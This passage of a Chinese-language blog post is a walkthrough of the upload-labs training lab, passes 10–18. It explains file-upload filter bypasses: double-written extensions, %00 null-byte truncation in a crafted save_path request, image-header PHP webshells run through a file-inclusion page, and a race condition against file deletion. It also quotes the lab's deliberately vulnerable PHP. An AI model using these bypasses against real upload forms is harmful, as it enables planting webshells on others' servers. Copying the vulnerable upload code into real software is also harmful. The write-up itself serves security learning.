class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>可以看到，他是按照 空格-点-空格 这个顺序来过滤的，我们只要构造一个字符串，使他过滤之后末尾还存在空格或者点就行</p>
<p>还有个比较关键的点就是，保存的文件名和原来一样，而不是通过检测到的合法的扩展名拼接而成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;  <span class="comment">// 重要的点</span></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    	<span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="pass-11（双写绕过）"><a href="#pass-11（双写绕过）" class="headerlink" title="pass-11（双写绕过）"></a>pass-11（双写绕过）</h1><p>这关从文件名中删去一些关键字，不区分大小写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p>这种替换成空，而且只替换一次的，可以尝试双写绕过</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.pphphp</span><br><span class="line">替换后</span><br><span class="line">=&gt; info.php</span><br></pre></td></tr></table></figure>

<p>这里有个小坑，在 php 的第二个 p 和 h之间插入php的话，过滤后是 hpp</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.phphpp</span>  =&gt;  <span class="selector-class">.hpp</span></span><br><span class="line"><span class="selector-class">.ph</span>(php)<span class="selector-tag">p</span>  <span class="comment">// 想象</span></span><br><span class="line">.(php)hpp  <span class="comment">// 现实</span></span><br></pre></td></tr></table></figure>

<p>这样不行，这个函数估计是从左往右顺序检测关键字</p>
<h1 id="pass-12（-00截断-get）"><a href="#pass-12（-00截断-get）" class="headerlink" title="pass-12（%00截断 get）"></a>pass-12（%00截断 get）</h1><p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>上传的路径一部分从 save_path 参数中获取，这意味着这部分是用户可控的</p>
<p>%00截断的条件，网上的说法</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">截断条件： 1.php版本小于5.3.4 详情关注CVE<span class="string">-2006</span><span class="string">-7243</span> 2.php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p>php版本更换为5.2.17（phpstudy切换php版本还是挺方便的），高版本应该是 move_uploaded_file 直接返回 false，上传失败</p>
<p>上传文件名以 jpg 作为扩展名，请求行（重点是查询字符串）如下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload-labs-master/</span>Pass-<span class="number">12</span><span class="regexp">/index.php?save_path=../u</span>pload<span class="regexp">/info.php%00 HTTP/</span><span class="number">1.1</span></span><br></pre></td></tr></table></figure>

<p>漏洞成因可能是php底层好像是用c写的，而c语言字符串以 空字节 / null / 0x00 / \0 作为结束符号，%00 是用url编码来表示 null，拼接成的$img_path 中间有个 null 截断了字符串</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">..upload</span>/<span class="meta">info</span>.php\x00/xxxxxx.jpg</span><br><span class="line">截断后</span><br><span class="line"><span class="symbol">..upload</span>/<span class="meta">info</span>.php  <span class="comment">// 保存的路径</span></span><br></pre></td></tr></table></figure>



<h1 id="pass-13（-00截断-post）"><a href="#pass-13（-00截断-post）" class="headerlink" title="pass-13（%00截断 post）"></a>pass-13（%00截断 post）</h1><p>与pass-12相比只是 get 换成了 post，不能使用 %00</p>
<p>null 是一个不可打印字符，无法直接从键盘输入，正常写代码时字符串中若需要null往往也是要转义成 \x00</p>
<p>burpsuite 的 proxy中，抓到包之后，请求行的上面有 raw，hex等，选择hex就能用16进制的值来编辑请求的内容，可以先给一个字符占位 比如</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/upload/</span>phpinfo.phpa</span><br></pre></td></tr></table></figure>

<p>之后找到对应位置，把a（0x61）改为 null（0x00）</p>
<p>或者右侧的body parameters中可以以其他编码方式转换成想要的内容（比较绕），先输个 %00 然后 burpsuite会给出一个 ‘\0’ ，然后复制他给出的 \0 ，之后再粘贴到想要的地方就 ok 了（感觉不如 hex 直接改）</p>
<h1 id="pass-14（检查头两个字节，文件头，图片马）"><a href="#pass-14（检查头两个字节，文件头，图片马）" class="headerlink" title="pass-14（检查头两个字节，文件头，图片马）"></a>pass-14（检查头两个字节，文件头，图片马）</h1><p>检查文件头</p>
<p>jpg、png、gif 等格式，头部都以固定的字节开始</p>
<p>比如 jpg 是 FF D8 ，根据不同格式接下来两字节 是 FF E0 或 FF E1</p>
<p>这关根据文件的头两个字节来判断文件类型，并重命名为正确的扩展名</p>
<p>推荐一个 16进制编辑器 HxD（hex editor），很久之前下的不记得在哪找的了，推荐理由无，主要是用的也不多，可以在一张正常的图片中，插入php代码，这样就可以绕过文件头检测（或者shell中好像有什么命令也可以做到相同的效果）</p>
<p>但是因为扩展名不是php，所以要配合文件包含利用</p>
<p>我们将</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>插入图片中，然后上传</p>
<p>根目录下的 include.php 文件提供了文件包含漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>之前网上看到是说找一张图片把php代码插进去，但我好像刚好找了一张不太行的图片，381行报错了，我甚至不知道怎么找到 381 行。最后试了一下在php代码前面加jpg文件的文件头，可以正常使用，应该就是图片的问题了</p>
<p>用 ps 自己做一张很小的图片，就没那么容易报错了</p>
<h1 id="pass-15（getimagesize，图片马）"><a href="#pass-15（getimagesize，图片马）" class="headerlink" title="pass-15（getimagesize，图片马）"></a>pass-15（getimagesize，图片马）</h1><p>两个没怎么见过的函数，描述如下</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getimagesize(string $filename,<span class="built_in"> array </span>&amp;$imageinfo = ?):<span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line">getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。</span><br><span class="line"></span><br><span class="line">如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。</span><br></pre></td></tr></table></figure>

<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">image<span class="constructor">_type_to_extension(<span class="params">int</span> $<span class="params">imagetype</span>, <span class="params">bool</span> $<span class="params">include_dot</span> = <span class="params">true</span>)</span>: <span class="built_in">string</span></span><br><span class="line"></span><br><span class="line">根据给定的常量 IMAGETYPE_XXX 返回后缀名。</span><br></pre></td></tr></table></figure>

<p>图片马和之前一样</p>
<h1 id="pass-16（exif-imagetype-图片）"><a href="#pass-16（exif-imagetype-图片）" class="headerlink" title="pass-16（exif_imagetype 图片）"></a>pass-16（exif_imagetype 图片）</h1><p>需要开启php_exif模块</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exif_imagetype</span><span class="params">(string <span class="variable">$filename</span>)</span></span>: int</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">exif_imagetype</span><span class="params">()</span></span> 读取一个图像的第一个字节并检查其签名。</span><br><span class="line"></span><br><span class="line">本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER<span class="selector-attr">[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>]</span> 结合使用来检查浏览器是否可以显示某个指定的图像。</span><br></pre></td></tr></table></figure>



<h1 id="pass-17（二次渲染-imagecreatefromjpeg）"><a href="#pass-17（二次渲染-imagecreatefromjpeg）" class="headerlink" title="pass-17（二次渲染 imagecreatefromjpeg）"></a>pass-17（二次渲染 imagecreatefromjpeg）</h1><p>上传后重新生成图像</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">imagecreatefromjpeg</span><span class="params">(string <span class="variable">$filename</span>)</span></span>: resource</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">imagecreatefromjpeg</span><span class="params">()</span></span> 返回一图像标识符，代表了从给定的文件名取得的图像。</span><br></pre></td></tr></table></figure>



<p>网上说 gif 的比较好做，只要把上传后的图片再下载回来，然后和之前的对比，把代码插到没有改变的部分就行</p>
<p>jpg和png比较难搞好像，我不太了解这些格式，寄（网上有脚本）</p>
<h1 id="pass-18（条件竞争）"><a href="#pass-18（条件竞争）" class="headerlink" title="pass-18（条件竞争）"></a>pass-18（条件竞争）</h1><p>文件上传相关代码，关键点在于，无论是否合法，先保存文件（不改名），如果非法，则删除文件，合法则改名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们同时做两件事，1、上传exp.php文件，2、访问上传的exp.php。服务器是并发处理这两个请求的，存在一种很巧合的情况，上传文件这条线处理到保存了文件但还没执行到unlink删除非法文件，这时服务器cpu转而去处理访问exp.php那条线，这样就成功访问到服务器上的exp.php了。这种情况发生的概率并不是100%，需要多次尝试。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/01/27/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/" rel="prev" title="用php写一个简易留言板">
      <i class="fa fa-chevron-left"></i> 用php写一个简易留言板
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-01%EF%BC%88%E5%89%8D%E7%AB%AFjs%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">pass-01（前端js验证）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81burp-suite-%E6%8A%93%E5%8C%85%EF%BC%8C%E5%86%8D%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D"><span class="nav-number">1.1.</span> <span class="nav-text">一、burp suite 抓包，再修改文件扩展名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%A6%86%E7%9B%96%E6%A3%80%E6%9F%A5%E5%87%BD%E6%95%B0%EF%BC%88f12%E4%B8%AD%E4%BF%AE%E6%94%B9js%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">二、浏览器控制台覆盖检查函数（f12中修改js代码）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-02%EF%BC%88MIME%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">pass-02（MIME）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-03%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%8C%E4%B8%8D%E5%B8%B8%E8%A7%81%E6%89%A9%E5%B1%95%E5%90%8D%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">pass-03（黑名单，不常见扩展名绕过）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-04%EF%BC%88-htaccess%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">pass-04（.htaccess）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-05%EF%BC%88-user-ini%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">pass-05（.user.ini）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-06%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">pass-06（大小写）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-07%EF%BC%88%E6%9C%AB%E5%B0%BE%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">pass-07（末尾空格）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-08%EF%BC%88%E6%9C%AB%E5%B0%BE%E7%82%B9%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">pass-08（末尾点）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-09%EF%BC%88-DATA%EF%BC%89"><span class="nav-number">9.</span> <span class="nav-text">pass-09（::$DATA）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-10%EF%BC%88%E6%9C%AB%E5%B0%BE%E7%A9%BA%E6%A0%BC%E5%92%8C%E7%82%B9%E4%BA%A4%E6%9B%BF%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">pass-10（末尾空格和点交替）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-11%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">11.</span> <span class="nav-text">pass-11（双写绕过）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-12%EF%BC%88-00%E6%88%AA%E6%96%AD-get%EF%BC%89"><span class="nav-number">12.</span> <span class="nav-text">pass-12（%00截断 get）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-13%EF%BC%88-00%E6%88%AA%E6%96%AD-post%EF%BC%89"><span class="nav-number">13.</span> <span class="nav-text">pass-13（%00截断 post）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-14%EF%BC%88%E6%A3%80%E6%9F%A5%E5%A4%B4%E4%B8%A4%E4%B8%AA%E5%AD%97%E8%8A%82%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%EF%BC%8C%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%89"><span class="nav-number">14.</span> <span class="nav-text">pass-14（检查头两个字节，文件头，图片马）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-15%EF%BC%88getimagesize%EF%BC%8C%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%89"><span class="nav-number">15.</span> <span class="nav-text">pass-15（getimagesize，图片马）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-16%EF%BC%88exif-imagetype-%E5%9B%BE%E7%89%87%EF%BC%89"><span class="nav-number">16.</span> <span class="nav-text">pass-16（exif_imagetype 图片）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-17%EF%BC%88%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93-imagecreatefromjpeg%EF%BC%89"><span class="nav-number">17.</span> <span class="nav-text">pass-17（二次渲染 imagecreatefromjpeg）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pass-18%EF%BC%88%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="nav-number">18.</span> <span class="nav-text">pass-18（条件竞争）</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="x4297"
      src="/images/Yuumi.jpg">
  <p class="site-author-name" itemprop="name">x4297</p>
  <div class="site-description" itemprop="description">开摆!</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">x4297</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
